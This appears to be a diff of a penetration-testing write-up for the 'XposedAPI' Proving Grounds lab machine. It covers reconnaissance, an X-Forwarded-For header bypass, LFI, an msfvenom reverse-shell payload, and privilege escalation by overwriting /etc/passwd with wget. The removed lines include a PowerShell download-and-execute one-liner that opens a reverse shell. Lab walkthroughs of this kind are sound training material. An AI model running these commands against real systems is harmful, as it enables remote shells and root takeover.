@@ -4,41 +4,6 @@ date created: 2023-09-18 23:07
 
 # XposedAPI - 192.168.214.134
 
-Recon:
-
-- [ ] AutoRecon
-- [ ] nmap
-- [ ] nmap udp
-- [ ] validate each finding with nc
-- [ ] check versions in exploit-db
-
-Web:
-
-- [ ] robots.txt / sitemap.xml
-- [ ] Default credentials
-- [ ] gobuster / wfuzz
-- [ ] Burpsuite
-- [ ] Check versions
-- [ ] Check file extensions in wfuzz
-
-**File Transfers**
-
-```shell
-powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://$myip:8000/tools/windows/powercat.ps1');powercat -c 192.168.45.165 -p 8001 powershell
-
-certutil -urlcache -split -f http://$myip:8000/tools/windows/powercat.ps1 powercat.ps1
-```
-
-**Shell Upgrades**
-
-```shell
-python -c 'import pty; pty.spawn("/bin/bash")'
-python3 -c 'import pty; pty.spawn("/bin/sh")'
-python3 -c "__import__('pty').spawn('/bin/bash')"
-python3 -c "__import__('subprocess').call(['/bin/bash'])"
-
-stty raw -echo; fg; reset
-```
 
 ### Nmap Scan
 
@@ -61,6 +26,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Initial Access
 
+- Lets probe out the http server
 ```shell
 http://192.168.214.134:13337/
 
@@ -86,7 +52,7 @@ To request the restart of the app.
 
 ```
 
-- Our vector is clear, use the /update endpoint and post a binary file with our reverse shell hosted on the url.
+- Our vector is seems clear, use the /update endpoint and post a binary file with our reverse shell hosted on the url.
 
 ```shell
 msfvenom -p linux/x84/shell_reverse_tcp LHOST=192.168.45.215 LPORT=4444 -f elf > shell.elf
@@ -135,7 +101,8 @@ X-XSS-Protection
 Set-Cookie
 ```
 
-![[Pasted image 20230915185209.png]]
+![image](https://github.com/1Gould/Proving-Grounds/assets/7574362/49f89f3d-7bdb-4a3b-ba65-b2204e175dd0)
+
 
 ```shell
 X-Forwarded-For: 127.0.0.1
@@ -161,7 +128,8 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 ```
 
-![[Pasted image 20230915185333.png]]
+![image](https://github.com/1Gould/Proving-Grounds/assets/7574362/08e65256-60fe-4ffc-b6af-b51d10961531)
+
 `clumsyadmin`
 
 Now let's relaunch our payload with the username and try to get a reverse shell.
@@ -181,7 +149,8 @@ Let's retrieve the location of the server files from the LFI and diagnose our er
 /usr/bin/python3/usr/local/gunicorn-w4-b0.0.0.0:1337main:app
 ```
 
-![[Pasted image 20230918215920.png]]
+![image](https://github.com/1Gould/Proving-Grounds/assets/7574362/874c8f2e-93b7-40e6-a1ea-e31cee1ab3d9)
+
 
 - `/home/clumsyadmin/webapp`
 
@@ -321,7 +290,8 @@ It expects a POST request so let's try that.
 curl -v -X POST -H "X-Forwarded-For: localhost" http://192.168.214.134/restart
 ```
 
-![[Pasted image 20230918224529.png]]
+![image](https://github.com/1Gould/Proving-Grounds/assets/7574362/7a1b0104-7f40-4f97-8c95-8d0437c629dc)
+
 
 ## Priv Esc
 
@@ -352,4 +322,4 @@ echo 'test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0:root:/root:/bin/bash' >> passwd
 wget http://192.168.45.215:8000/passwd -O /etc/passwd
 ```
 
-![[Pasted image 20230918230543.png]]
+![image](https://github.com/1Gould/Proving-Grounds/assets/7574362/0583dcac-c0a6-46ff-b8a8-57bba33213a1)
